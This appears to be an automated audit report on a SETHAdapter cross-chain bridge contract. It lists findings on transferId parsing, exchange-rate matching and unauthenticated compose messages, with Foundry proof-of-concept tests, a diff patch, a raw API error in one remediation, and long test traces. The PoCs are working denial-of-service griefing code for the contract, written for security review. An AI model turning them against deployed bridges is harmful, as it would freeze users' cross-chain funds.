# Audited by [V12](https://zellic.ai/)

The only autonomous Solidity auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.


---

# Transfer ID parsed from wrong offset
**#2**
- Severity: High
- Validity: Unreviewed

## Targets
- lzCompose (SETHAdapter)

## Affected Locations
- **SETHAdapter.lzCompose**: Single finding location

## Description

Each `send` encodes a unique `transferId` via `abi.encode(transferId)` and relies on that ID to correlate the ETH compose message with the SETH mint message. Both `lzCompose` and `_lzReceive` attempt to decode the ID but load memory at `rawCompose + 64`, which skips past the only 32‑byte payload. This makes the decoded `transferId` effectively zero or uninitialized for every message, so all transfers share the same `(srcEid, transferId)` slot in `ethQueue` and `pendingMints`. When two transfers overlap or their messages arrive out of order, the second message sees an existing entry and reverts with `InvalidAmount`, preventing processing until a manual retry after the first clears the slot. A griefer can repeatedly initiate transfers to keep the slot occupied and effectively block bridging from that source chain.

## Root cause

The assembly in `lzCompose` and `_lzReceive` reads the second 32‑byte word of the compose payload instead of the first, so the actual encoded `transferId` is never read.

## Impact

Legitimate transfers can be rejected or delayed because unrelated messages collide under the same `transferId`, leaving ETH or SETH messages stuck until retried. An attacker can exploit this by initiating transfers to keep the shared slot occupied, creating a denial‑of‑service that freezes users’ cross‑chain transfers until manual intervention.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.34;

import { Test } from "forge-std/Test.sol";
import { SETH } from "@core/SETH.sol";
import { SETHAdapter } from "@core/SETHAdapter.sol";
import { OFTMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTMsgCodec.sol";
import { OFTComposeMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTComposeMsgCodec.sol";
import { Origin } from "@layerzerolabs/oapp-evm/contracts/oapp/OAppReceiver.sol";

contract EndpointMock {
    address public delegate;

    function setDelegate(address _delegate) external {
        delegate = _delegate;
    }
}

contract EthOFTMock {
    function sendEth(address adapter) external payable {
        (bool ok, ) = adapter.call{ value: msg.value }("");
        require(ok, "send failed");
    }
}

contract SETHAdapterTransferIdBugTest is Test {
    SETH public seth;
    SETHAdapter public adapter;
    EndpointMock public endpoint;
    EthOFTMock public ethOft;

    uint32 constant SRC_EID = 1;
    bytes32 constant PEER = bytes32(uint256(uint160(address(0xBEEF))));

    function setUp() public {
        vm.deal(address(this), 100 ether);
        endpoint = new EndpointMock();
        ethOft = new EthOFTMock();

        uint256 nonce = vm.getNonce(address(this));
        address predictedAdapter = _computeCreateAddress(address(this), nonce + 1);
        seth = new SETH(predictedAdapter);
        adapter = new SETHAdapter(address(seth), address(ethOft), address(endpoint), address(this));
        assertEq(address(adapter), predictedAdapter);

        adapter.setPeer(SRC_EID, PEER);
    }

    function test_pendingMintNotProcessedWhenEthArrives() public {
        address recipient = makeAddr("recipient");
        uint256 sethAmountLD = 1000 ether; // 10 ETH worth of SETH
        uint64 amountSD = uint64(sethAmountLD / adapter.decimalConversionRate());

        bytes memory sethMsg = _buildOftMessage(recipient, amountSD, 1);
        Origin memory origin = Origin({ srcEid: SRC_EID, sender: PEER, nonce: 1 });
        vm.prank(address(endpoint));
        adapter.lzReceive(origin, bytes32("seth"), sethMsg, address(0), "");

        ethOft.sendEth{ value: 10 ether }(address(adapter));
        bytes memory composeEth = _buildComposeMessage(SRC_EID, 10 ether, 1);
        vm.prank(address(endpoint));
        adapter.lzCompose(address(ethOft), bytes32("eth"), composeEth, address(0), "");

        assertEq(seth.balanceOf(recipient), sethAmountLD, "SETH should mint once ETH arrives");
    }

    function _buildComposeMessage(uint32 srcEid, uint256 amountLD, uint256 transferId) internal view returns (bytes memory) {
        bytes memory composeMsg = abi.encodePacked(bytes32(uint256(uint160(address(adapter)))), abi.encode(transferId));
        return OFTComposeMsgCodec.encode(1, srcEid, amountLD, composeMsg);
    }

    function _buildOftMessage(address to, uint64 amountSD, uint256 transferId) internal view returns (bytes memory) {
        (bytes memory message, ) = OFTMsgCodec.encode(bytes32(uint256(uint160(to))), amountSD, abi.encode(transferId));
        return message;
    }

    function _computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) {
        require(nonce <= 0x7f, "nonce too large");
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce)));
        return address(uint160(uint256(hash)));
    }
}
```

## Remediation

**Status:** Error

### Explanation

Modify the assembly in `lzCompose` and `_lzReceive` to decode `transferId` from the first 32‑byte word of the compose payload (offset 0), and align the encoding/decoding format so the same bytes are written and read. Add a payload length check to ensure at least 32 bytes are present before reading to avoid misparsing.

### Error

Error code: 400 - {'error': {'message': 'Your input exceeds the context window of this model. Please adjust your input and try again.', 'type': 'invalid_request_error', 'param': 'input', 'code': 'context_length_exceeded'}}

---

# Mutable exchange rate breaks leg matching
**#3**
- Severity: High
- Validity: Invalid

## Targets
- _credit (SETHAdapter)
- _processPendingMint (SETHAdapter)

## Affected Locations
- **SETHAdapter._credit**: `_credit` derives `expectedEthAmount` from the current `ISETH(SETH).EXCHANGE_RATE()` and strictly compares it to the previously queued ETH amount; changing this logic to use a per-`transferId` snapshot/recorded expected value (or a tolerant matching rule) is necessary to prevent rate drift from reverting and locking transfers.
- **SETHAdapter._processPendingMint**: `_processPendingMint` finalizes only when both legs exist and then recomputes `expectedEthAmount` from the current exchange rate with an exact-equality requirement; persisting the rate/expected ETH at the time the first leg is recorded (or removing exact equality) here remediates the stuck-pending condition during finalization.

## Description

The adapter matches two asynchronous “legs” of a transfer (a queued ETH amount and a pending SETH mint) by recomputing an `expectedEthAmount` using the current `ISETH(SETH).EXCHANGE_RATE()` and requiring it to exactly equal the ETH amount stored when the first leg arrived. Because the two legs can be recorded in different transactions, the exchange rate can change between leg arrival and matching, making the strict equality check fail. When the check fails, the matching function reverts and leaves the queue entries intact, so the same transfer remains pending and cannot progress. This creates a liveness failure where legitimate inbound transfers can become indefinitely stuck unless the exchange rate happens to return to the original value. Anyone able to influence, trigger, or opportunistically time exchange-rate updates can repeatedly cause mismatches and keep transfers from finalizing.

## Root cause

The code recomputes required ETH from a mutable `EXCHANGE_RATE()` at processing/credit time instead of persisting the exchange-rate snapshot or exact expected ETH amount per `transferId` when the transfer is created.

## Impact

Legitimate transfers can become unprocessable, leaving ETH stuck in `ethQueue` and preventing SETH from being minted/credited to recipients. An attacker who can manipulate or time exchange-rate updates can grief users by forcing persistent mismatches, effectively halting inbound transfer finalization for targeted transfers (or broadly, depending on usage patterns).

## Remediation

**Status:** Incomplete

### Explanation

Persist a per‑transfer snapshot of the exchange rate or computed required ETH amount when the transfer is initiated, and store it keyed by `transferId`. Use this stored value in `_credit` to validate/match legs instead of recomputing from the mutable `EXCHANGE_RATE()`, so processing remains consistent regardless of later rate changes.

---

# Unverified compose origin allows queue poisoning
**#1**
- Severity: Medium
- Validity: Unreviewed

## Targets
- lzCompose (SETHAdapter)

## Affected Locations
- **SETHAdapter.lzCompose**: Single finding location

## Description

The `lzCompose` handler only checks that the caller is the endpoint and `_from` equals `ETH_OFT`, then blindly extracts a `transferId` from the compose payload. It never validates the embedded compose sender (`composeFrom`) or otherwise ensures that the payload was generated by the SETH adapter on the source chain. Because `ETH_OFT` is permissionless, any user can send an OFT transfer to this adapter with an arbitrary compose payload and chosen `transferId`. The function will record the attacker-chosen `amountLD` in `ethQueue` even when no matching pending mint exists. If a legitimate transfer later uses the same `transferId` but a different amount, `_processPendingMint` will revert and the queue entry cannot be overwritten, leaving the bridge transfer stuck.

## Root cause

The compose callback trusts any `ETH_OFT` compose payload without authenticating the compose sender or binding `transferId` to an authorized adapter, allowing attacker-controlled queue entries.

## Impact

An attacker can poison `ethQueue` for a predictable `transferId` with a mismatched amount, causing subsequent legitimate transfers with that id to revert and remain unprocessed. Users can have their burned SETH stuck on the source chain until an administrator clears the queue or intervenes, creating a denial-of-service on bridging.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.34;

import { Test } from "forge-std/Test.sol";
import { SETH } from "@core/SETH.sol";
import { SETHAdapter } from "@core/SETHAdapter.sol";
import { OFTMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTMsgCodec.sol";
import { OFTComposeMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTComposeMsgCodec.sol";
import { Origin } from "@layerzerolabs/oapp-evm/contracts/oapp/OAppReceiver.sol";

// -----------------------------------------------------------------------------
// Mocks
// -----------------------------------------------------------------------------

contract EndpointMock {
    address public delegate;

    function setDelegate(address _delegate) external {
        delegate = _delegate;
    }
}

contract EthOFTMock {
    function sendEth(address adapter) external payable {
        (bool ok, ) = adapter.call{ value: msg.value }("");
        require(ok, "send failed");
    }
}

// -----------------------------------------------------------------------------
// POC
// -----------------------------------------------------------------------------

contract SETHAdapterComposePoisonTest is Test {
    SETH public seth;
    SETHAdapter public adapter;
    EndpointMock public endpoint;
    EthOFTMock public ethOft;

    uint32 constant SRC_EID = 1;
    bytes32 constant PEER = bytes32(uint256(uint160(address(0xBEEF))));

    function setUp() public {
        endpoint = new EndpointMock();
        ethOft = new EthOFTMock();

        uint256 nonce = vm.getNonce(address(this));
        address predictedAdapter = _computeCreateAddress(address(this), nonce + 1);
        seth = new SETH(predictedAdapter);
        adapter = new SETHAdapter(address(seth), address(ethOft), address(endpoint), address(this));
        assertEq(address(adapter), predictedAdapter);

        adapter.setPeer(SRC_EID, PEER);
    }

    /// @notice An attacker can poison `ethQueue` with arbitrary compose payloads, blocking later legitimate transfers.
    function test_poisonedQueueBlocksLegitTransfer() public {
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 transferId = 0; // what lzCompose/_lzReceive parse from a 32-byte compose payload

        // Attacker sends ETH via permissionless ETH_OFT with arbitrary compose payload.
        vm.prank(attacker);
        ethOft.sendEth{ value: 1 ether }(address(adapter));

        bytes memory maliciousCompose = _buildComposeMessage(attacker, SRC_EID, 1 ether, transferId);
        vm.prank(address(endpoint));
        adapter.lzCompose(address(ethOft), bytes32("poison"), maliciousCompose, address(0), "");

        assertEq(adapter.ethQueue(SRC_EID, transferId), 1 ether);

        // Legitimate SETH message arrives with same transferId but different amount.
        address recipient = makeAddr("recipient");
        uint256 sethAmountLD = 1000 ether; // 10 ETH worth of SETH
        uint64 amountSD = uint64(sethAmountLD / adapter.decimalConversionRate());
        bytes memory legitMsg = _buildOftMessage(recipient, amountSD, transferId);

        Origin memory origin = Origin({ srcEid: SRC_EID, sender: PEER, nonce: 1 });
        vm.prank(address(endpoint));
        vm.expectRevert(SETHAdapter.InvalidAmount.selector);
        adapter.lzReceive(origin, bytes32("legit"), legitMsg, address(0), "");

        // Queue entry remains stuck, preventing the legitimate mint from ever completing.
        assertEq(adapter.ethQueue(SRC_EID, transferId), 1 ether);
        assertEq(seth.balanceOf(recipient), 0);
    }

    // -------------------------------------------------------------------------
    // Helpers
    // -------------------------------------------------------------------------

    function _buildComposeMessage(
        address composeFrom,
        uint32 srcEid,
        uint256 amountLD,
        uint256 transferId
    ) internal pure returns (bytes memory) {
        bytes memory composeMsg = abi.encodePacked(bytes32(uint256(uint160(composeFrom))), abi.encode(transferId));
        return OFTComposeMsgCodec.encode(1, srcEid, amountLD, composeMsg);
    }

    function _buildOftMessage(address to, uint64 amountSD, uint256 transferId) internal view returns (bytes memory) {
        (bytes memory message, ) = OFTMsgCodec.encode(bytes32(uint256(uint160(to))), amountSD, abi.encode(transferId));
        return message;
    }

    function _computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) {
        require(nonce <= 0x7f, "nonce too large");
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce)));
        return address(uint160(uint256(hash)));
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Gate `lzCompose` on a trusted `composeFrom` by requiring it to match the configured `sethAdapters[srcEid]` (or the `owner()` for trusted administrative sends) so arbitrary ETH_OFT callers cannot spoof compose payloads and poison `ethQueue`.

### Patch

```diff
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -325,6 +325,13 @@
         if (_from != ETH_OFT) revert InvalidComposeSender();
 
         uint32 srcEid = OFTComposeMsgCodec.srcEid(_message);
+        bytes32 composeFrom = OFTComposeMsgCodec.composeFrom(_message);
+        address expectedAdapter = sethAdapters[srcEid];
+        if (composeFrom != OFTComposeMsgCodec.addressToBytes32(owner())) {
+            if (expectedAdapter == address(0) || composeFrom != OFTComposeMsgCodec.addressToBytes32(expectedAdapter)) {
+                revert InvalidComposeSender();
+            }
+        }
         uint256 amountLD = OFTComposeMsgCodec.amountLD(_message);
         bytes memory rawCompose = OFTComposeMsgCodec.composeMsg(_message);
```

### Affected Files

- `contracts/src/core/SETHAdapter.sol`

### Validation Output

```
No files changed, compilation skipped

Ran 1 test for test/Generated.t.sol:SETHAdapterComposePoisonTest
[FAIL: InvalidComposeSender()] test_poisonedQueueBlocksLegitTransfer() (gas: 39667)
Traces:
  [4655609] SETHAdapterComposePoisonTest::setUp()
    ├─ [30487] → new EndpointMock@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 152 bytes of code
    ├─ [47905] → new EthOFTMock@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 239 bytes of code
    ├─ [0] VM::getNonce(SETHAdapterComposePoisonTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 3
    ├─ [1024981] → new SETH@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 4776 bytes of code
    ├─ [3317706] → new SETHAdapter@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
    │   ├─ [329] SETH::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: SETHAdapterComposePoisonTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [22342] EndpointMock::setDelegate(SETHAdapterComposePoisonTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 16217 bytes of code
    ├─ [24104] SETHAdapter::setPeer(1, 0x000000000000000000000000000000000000000000000000000000000000beef)
    │   ├─ emit PeerSet(eid: 1, peer: 0x000000000000000000000000000000000000000000000000000000000000beef)
    │   └─ ← [Stop]
    └─ ← [Return]

  [39667] SETHAdapterComposePoisonTest::test_poisonedQueueBlocksLegitTransfer()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return]
    ├─ [0] VM::deal(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], 1000000000000000000 [1e18])
    │   └─ ← [Return]
    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
    │   └─ ← [Return]
    ├─ [9643] EthOFTMock::sendEth{value: 1000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [6695] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x706f69736f6e0000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e0000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Revert] InvalidComposeSender()
    └─ ← [Revert] InvalidComposeSender()

Backtrace:
  at SETHAdapter.lzCompose
  at SETHAdapterComposePoisonTest.test_poisonedQueueBlocksLegitTransfer

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.43ms (451.74µs CPU time)

Ran 5 tests for test/core/SETH.t.sol:SETHTest
[PASS] test_deposit_mintsAt100to1() (gas: 63634)
Traces:
  [63634] SETHTest::test_deposit_mintsAt100to1()
    ├─ [0] VM::deal(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [47089] SETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [735] SETH::balanceOf(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    └─ ← [Return]

[PASS] test_ethCollateral_excludesAccruedFees() (gas: 118642)
Traces:
  [118642] SETHTest::test_ethCollateral_excludesAccruedFees()
    ├─ [0] VM::deal(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [47089] SETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] r: [0xA2BE67f5BD728df59cefd430CC3A454Bb4029B45]
    ├─ [0] VM::label(r: [0xA2BE67f5BD728df59cefd430CC3A454Bb4029B45], "r")
    │   └─ ← [Return]
    ├─ [51927] SETH::transfer(r: [0xA2BE67f5BD728df59cefd430CC3A454Bb4029B45], 100000000000000000000 [1e20])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: r: [0xA2BE67f5BD728df59cefd430CC3A454Bb4029B45], value: 99700000000000000000 [9.97e19])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 300000000000000000 [3e17])
    │   ├─ emit FeesAccrued(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amountAdded: 3000000000000000 [3e15], totalOutstanding: 3000000000000000 [3e15])
    │   └─ ← [Return] true
    ├─ [674] SETH::ethCollateral() [staticcall]
    │   └─ ← [Return] 9997000000000000000 [9.997e18]
    ├─ [652] SETH::accruedFeesInEth() [staticcall]
    │   └─ ← [Return] 3000000000000000 [3e15]
    └─ ← [Return]

[PASS] test_isFullyBacked_excludesAccruedFees() (gas: 117980)
Traces:
  [117980] SETHTest::test_isFullyBacked_excludesAccruedFees()
    ├─ [0] VM::deal(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [47089] SETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [51927] SETH::transfer(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 100000000000000000000 [1e20])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], value: 99700000000000000000 [9.97e19])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 300000000000000000 [3e17])
    │   ├─ emit FeesAccrued(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amountAdded: 3000000000000000 [3e15], totalOutstanding: 3000000000000000 [3e15])
    │   └─ ← [Return] true
    ├─ [904] SETH::isFullyBacked() [staticcall]
    │   └─ ← [Return] true, 10000 [1e4]
    └─ ← [Return]

[PASS] test_transfer_appliesFee() (gas: 118689)
Traces:
  [118689] SETHTest::test_transfer_appliesFee()
    ├─ [0] VM::deal(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [47089] SETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [51927] SETH::transfer(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], 100000000000000000000 [1e20])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], value: 99700000000000000000 [9.97e19])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 300000000000000000 [3e17])
    │   ├─ emit FeesAccrued(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amountAdded: 3000000000000000 [3e15], totalOutstanding: 3000000000000000 [3e15])
    │   └─ ← [Return] true
    ├─ [735] SETH::balanceOf(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]) [staticcall]
    │   └─ ← [Return] 99700000000000000000 [9.97e19]
    ├─ [652] SETH::accruedFeesInEth() [staticcall]
    │   └─ ← [Return] 3000000000000000 [3e15]
    └─ ← [Return]

[PASS] test_withdraw_burnsAndSendsEth() (gas: 76523)
Traces:
  [79323] SETHTest::test_withdraw_burnsAndSendsEth()
    ├─ [0] VM::deal(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [47089] SETH::deposit{value: 10000000000000000000}()
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [15157] SETH::withdraw(100000000000000000000 [1e20])
    │   ├─ emit Transfer(from: SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, value: 100000000000000000000 [1e20])
    │   ├─ [67] SETHTest::receive{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [735] SETH::balanceOf(SETHTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 900000000000000000000 [9e20]
    └─ ← [Return]

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 3.84ms (2.52ms CPU time)

Ran 6 tests for test/core/SETH.t.sol:SETHAdapterAmountBindingTest
[PASS] test_credit_revertsOnDuplicatePendingMint() (gas: 80863)
Traces:
  [80863] SETHAdapterAmountBindingTest::test_credit_revertsOnDuplicatePendingMint()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [751] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [57897] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746831000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ emit OFTReceived(guid: 0x7365746831000000000000000000000000000000000000000000000000000000, srcEid: 1, toAddress: recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], amountReceivedLD: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2c5211c600000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [4273] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746832000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   └─ ← [Revert] InvalidAmount()
    └─ ← [Return]

[PASS] test_credit_revertsWhenQueuedEthMismatchesMessageAmount() (gas: 79143)
Traces:
  [79143] SETHAdapterAmountBindingTest::test_credit_revertsWhenQueuedEthMismatchesMessageAmount()
    ├─ [9643] EthOFTMock::sendEth{value: 1000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [34460] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6574680000000000000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Stop]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5]
    ├─ [0] VM::label(recipient: [0x006217c47ffA5Eb3F3c92247ffFE22AD998242c5], "recipient")
    │   └─ ← [Return]
    ├─ [751] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: 2c5211c600000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [8433] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746800000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000006217c47ffa5eb3f3c92247fffe22ad998242c5000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   └─ ← [Revert] InvalidAmount()
    └─ ← [Return]

[PASS] test_ethFirstThenSeth_mintsCorrectly() (gas: 124891)
Traces:
  [144791] SETHAdapterAmountBindingTest::test_ethFirstThenSeth_mintsCorrectly()
    ├─ [9643] EthOFTMock::sendEth{value: 10000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
